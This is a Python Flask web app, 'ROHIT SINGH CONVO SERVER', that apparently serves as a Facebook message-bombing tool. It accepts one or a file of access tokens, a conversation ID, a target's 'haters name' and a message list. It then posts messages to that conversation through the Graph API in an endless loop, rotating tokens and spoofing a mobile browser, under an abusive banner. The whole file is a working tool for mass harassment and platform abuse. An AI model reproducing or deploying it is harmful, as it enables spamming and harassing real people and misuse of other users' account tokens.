from flask import Flask, render_template_string, request, jsonify
import requests
import time
import threading
import random
import string
import os
from datetime import datetime

app = Flask(__name__)
app.secret_key = 'your_secret_key_here'

# Global dictionary to store active tasks
active_tasks = {}

class MessageSender:
    def __init__(self, task_key, tokens, convo_id, hatersname, lastname, delay, messages):
        self.task_key = task_key
        self.tokens = tokens
        self.convo_id = convo_id
        self.hatersname = hatersname
        self.lastname = lastname
        self.delay = delay
        self.messages = messages
        self.is_running = True
        self.current_status = "Running"
        self.sent_count = 0
        self.token_index = 0
        self.msg_index = 0
        
    def generate_message(self, message):
        return f"{self.hatersname}___{message}___{self.lastname}"
    
    def send_message(self, token, message, msg_number):
        headers = {
            'Connection': 'keep-alive',
            'Cache-Control': 'max-age=0',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
            'referer': 'www.google.com'
        }
        
        formatted_message = self.generate_message(message)
        url = f"https://graph.facebook.com/v17.0/t_{self.convo_id}/"
        
        try:
            # Facebook Graph API के लिए access_token parameter में pass करना होगा
            params = {'access_token': token}
            data = {'message': formatted_message}
            
            response = requests.post(url, headers=headers, params=params, data=data, timeout=30)
            
            log_message = f"Ha Raj mishra server se msg no. [{msg_number}] msg format [{formatted_message}] chala gya successfully convo id [{self.convo_id}] me token no. [{self.token_index + 1}] se"
            print(log_message)
            
            # Rate limiting - 2 messages per minute per token
            time.sleep(30)
            
            return True, log_message
        except Exception as e:
            error_msg = f"Error sending message: {str(e)}"
            print(error_msg)
            return False, error_msg
    
    def start_sending(self):
        def run():
            while self.is_running:
                try:
                    if len(self.tokens) == 1:
                        # Single token mode
                        token = self.tokens[0]
                        for i, message in enumerate(self.messages):
                            if not self.is_running:
                                break
                            success, log = self.send_message(token, message, i+1)
                            self.sent_count += 1
                            time.sleep(self.delay)
                        
                        if self.is_running:
                            time.sleep(30)
                    
                    else:
                        # Multiple tokens mode
                        token = self.tokens[self.token_index]
                        message = self.messages[self.msg_index]
                        
                        success, log = self.send_message(token, message, self.msg_index + 1)
                        self.sent_count += 1
                        
                        # Move to next token and message
                        self.token_index = (self.token_index + 1) % len(self.tokens)
                        self.msg_index = (self.msg_index + 1) % len(self.messages)
                        
                        time.sleep(self.delay)
                        
                        # If all messages sent in cycle, wait 30 seconds
                        if self.msg_index == 0 and self.is_running:
                            time.sleep(30)
                
                except Exception as e:
                    print(f"Auto-solving error: {str(e)}")
                    time.sleep(5)
                    continue
        
        thread = threading.Thread(target=run)
        thread.daemon = True
        thread.start()
    
    def stop(self):
        self.is_running = False
        self.current_status = "Stopped"

def generate_task_key():
    return f"RAJ_[{''.join(random.choices(string.digits, k=10))}]"

# HTML Template as string
HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ROHIT SINGH CONVO SERVER</title>
    <style>
        body {
            background: linear-gradient(135deg, #ffffff 0%, #e8f5e8 100%);
            font-family: 'Arial', sans-serif;
            margin: 0;
            padding: 20px;
            color: #333;
        }
        
        .container {
            max-width: 800px;
            margin: 0 auto;
            background: white;
            padding: 30px;
            border-radius: 15px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
            border: 3px solid #4CAF50;
        }
        
        .header {
            text-align: center;
            margin-bottom: 30px;
            padding-bottom: 20px;
            border-bottom: 2px solid #4CAF50;
        }
        
        .header h1 {
            color: #2E7D32;
            font-weight: bold;
            font-size: 2.5em;
            margin: 0;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.1);
        }
        
        .header h2 {
            color: #388E3C;
            font-weight: bold;
            margin: 10px 0;
        }
        
        .form-group {
            margin-bottom: 20px;
            padding: 15px;
            background: #f9fff9;
            border-radius: 10px;
            border-left: 4px solid #4CAF50;
        }
        
        label {
            font-weight: bold;
            display: block;
            margin-bottom: 8px;
            color: #2E7D32;
            font-size: 1.1em;
        }
        
        input, select, textarea {
            width: 100%;
            padding: 12px;
            border: 2px solid #4CAF50;
            border-radius: 8px;
            font-size: 16px;
            box-sizing: border-box;
            background: #fff;
        }
        
        input:focus, select:focus, textarea:focus {
            outline: none;
            border-color: #2E7D32;
            box-shadow: 0 0 10px rgba(76, 175, 80, 0.3);
        }
        
        .btn {
            background: linear-gradient(135deg, #4CAF50 0%, #2E7D32 100%);
            color: white;
            padding: 15px 30px;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-size: 18px;
            font-weight: bold;
            margin: 10px 5px;
            transition: all 0.3s ease;
        }
        
        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
        }
        
        .btn-stop {
            background: linear-gradient(135deg, #f44336 0%, #c62828 100%);
        }
        
        .task-section {
            margin-top: 30px;
            padding: 20px;
            background: #f1f8e9;
            border-radius: 10px;
            border: 2px solid #C8E6C9;
        }
        
        .log-section {
            margin-top: 20px;
            padding: 15px;
            background: #000;
            color: #00ff00;
            border-radius: 8px;
            font-family: 'Courier New', monospace;
            height: 200px;
            overflow-y: auto;
            border: 2px solid #4CAF50;
        }
        
        .footer {
            text-align: center;
            margin-top: 30px;
            padding: 20px;
            background: #2E7D32;
            color: white;
            border-radius: 10px;
            font-weight: bold;
        }
        
        .note {
            background: #FFF3E0;
            border: 2px solid #FF9800;
            padding: 15px;
            border-radius: 8px;
            margin: 15px 0;
            font-weight: bold;
            text-align: center;
        }
        
        .active-tasks {
            background: #E8F5E9;
            padding: 15px;
            border-radius: 8px;
            margin: 10px 0;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>ROHIT SINGH CONVO SERVER</h1>
            <h2>Advanced Message Sending System</h2>
        </div>
        
        <div class="note">
            HATERO KI MKC
        </div>

        <form id="messageForm">
            <div class="form-group">
                <label>1. Token Type:</label>
                <select id="tokenType" name="token_type" onchange="toggleTokenInput()">
                    <option value="single">Single Token</option>
                    <option value="file">Token File</option>
                </select>
            </div>

            <div class="form-group" id="singleTokenGroup">
                <label>Single Token:</label>
                <input type="text" name="single_token" placeholder="Enter single token">
            </div>

            <div class="form-group" id="tokenFileGroup" style="display: none;">
                <label>Token File:</label>
                <input type="file" name="token_file" accept=".txt">
            </div>

            <div class="form-group">
                <label>2. Conversation ID:</label>
                <input type="text" name="convo_id" placeholder="Enter conversation ID" required>
            </div>

            <div class="form-group">
                <label>3. Haters Name:</label>
                <input type="text" name="hatersname" placeholder="Enter haters name" required>
            </div>

            <div class="form-group">
                <label>4. Last Name:</label>
                <input type="text" name="lastname" placeholder="Enter last name" required>
            </div>

            <div class="form-group">
                <label>5. Time Delay (seconds):</label>
                <input type="number" name="delay" value="1" min="1" required>
            </div>

            <div class="form-group">
                <label>6. Messages File:</label>
                <input type="file" name="msg_file" accept=".txt" required>
            </div>

            <button type="button" class="btn" onclick="startTask()">Start Task</button>
        </form>

        <div class="task-section">
            <h3>Task Management</h3>
            <div id="taskStatus"></div>
            <div id="activeTasks" class="active-tasks"></div>
            <button type="button" class="btn btn-stop" onclick="stopAllTasks()">Stop All Tasks</button>
        </div>

        <div class="log-section" id="logs">
            Logs will appear here...
        </div>

        <div class="footer">
            DEVELOPER:- BR0K3N H34RT R0H!T S!NGH
        </div>
    </div>

    <script>
        function toggleTokenInput() {
            const tokenType = document.getElementById('tokenType').value;
            document.getElementById('singleTokenGroup').style.display = 
                tokenType === 'single' ? 'block' : 'none';
            document.getElementById('tokenFileGroup').style.display = 
                tokenType === 'file' ? 'block' : 'none';
        }

        function addLog(message) {
            const logs = document.getElementById('logs');
            const timestamp = new Date().toLocaleTimeString();
            logs.innerHTML += `[${timestamp}] ${message}\\n`;
            logs.scrollTop = logs.scrollHeight;
        }

        function startTask() {
            const formData = new FormData(document.getElementById('messageForm'));
            
            fetch('/start_task', {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    addLog(data.message);
                    updateActiveTasks();
                } else {
                    addLog('Error: ' + data.message);
                }
            })
            .catch(error => {
                addLog('Error: ' + error);
            });
        }

        function stopTask(taskKey) {
            fetch('/stop_task', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({task_key: taskKey})
            })
            .then(response => response.json())
            .then(data => {
                addLog(data.message);
                updateActiveTasks();
            });
        }

        function stopAllTasks() {
            fetch('/get_active_tasks')
            .then(response => response.json())
            .then(data => {
                data.tasks.forEach(task => {
                    stopTask(task.task_key);
                });
            });
        }

        function updateActiveTasks() {
            fetch('/get_active_tasks')
            .then(response => response.json())
            .then(data => {
                const tasksDiv = document.getElementById('activeTasks');
                if (data.tasks.length === 0) {
                    tasksDiv.innerHTML = 'No active tasks';
                } else {
                    let html = '<h4>Active Tasks:</h4>';
                    data.tasks.forEach(task => {
                        html += `
                            <div style="margin: 10px 0; padding: 10px; background: #C8E6C9; border-radius: 5px;">
                                <strong>${task.task_key}</strong><br>
                                Status: ${task.status} | Sent: ${task.sent_count}
                                <button onclick="stopTask('${task.task_key}')" style="float: right;">Stop</button>
                            </div>
                        `;
                    });
                    tasksDiv.innerHTML = html;
                }
            });
        }

        // Update tasks every 5 seconds
        setInterval(updateActiveTasks, 5000);
        
        // Initial call
        toggleTokenInput();
        updateActiveTasks();
    </script>
</body>
</html>
'''

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/start_task', methods=['POST'])
def start_task():
    try:
        # Get form data
        token_type = request.form.get('token_type')
        tokens = []
        
        if token_type == 'single':
            token = request.form.get('single_token')
            if token:
                tokens = [token.strip()]
        else:
            token_file = request.files.get('token_file')
            if token_file:
                content = token_file.read().decode('utf-8')
                tokens = [line.strip() for line in content.split('\n') if line.strip()]
        
        convo_id = request.form.get('convo_id')
        hatersname = request.form.get('hatersname')
        lastname = request.form.get('lastname')
        delay = float(request.form.get('delay'))
        
        # Read messages file
        msg_file = request.files.get('msg_file')
        messages = []
        if msg_file:
            content = msg_file.read().decode('utf-8')
            messages = [line.strip() for line in content.split('\n') if line.strip()]
        
        if not tokens or not messages or not convo_id:
            return jsonify({'success': False, 'message': 'Missing required fields'})
        
        # Generate task key
        task_key = generate_task_key()
        
        # Create and start message sender
        sender = MessageSender(task_key, tokens, convo_id, hatersname, lastname, delay, messages)
        active_tasks[task_key] = sender
        sender.start_sending()
        
        return jsonify({
            'success': True, 
            'task_key': task_key,
            'message': f'Task started successfully with key: {task_key}'
        })
    
    except Exception as e:
        return jsonify({'success': False, 'message': f'Error: {str(e)}'})

@app.route('/stop_task', methods=['POST'])
def stop_task():
    try:
        task_key = request.json.get('task_key')
        if task_key in active_tasks:
            active_tasks[task_key].stop()
            del active_tasks[task_key]
            return jsonify({'success': True, 'message': 'Task stopped successfully'})
        else:
            return jsonify({'success': False, 'message': 'Task not found'})
    except Exception as e:
        return jsonify({'success': False, 'message': f'Error: {str(e)}'})

@app.route('/task_status', methods=['POST'])
def task_status():
    try:
        task_key = request.json.get('task_key')
        if task_key in active_tasks:
            task = active_tasks[task_key]
            return jsonify({
                'success': True,
                'status': task.current_status,
                'sent_count': task.sent_count,
                'is_running': task.is_running
            })
        else:
            return jsonify({'success': False, 'message': 'Task not found'})
    except Exception as e:
        return jsonify({'success': False, 'message': f'Error: {str(e)}'})

@app.route('/get_active_tasks', methods=['GET'])
def get_active_tasks():
    tasks_info = []
    for key, task in active_tasks.items():
        tasks_info.append({
            'task_key': key,
            'status': task.current_status,
            'sent_count': task.sent_count
        })
    return jsonify({'tasks': tasks_info})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
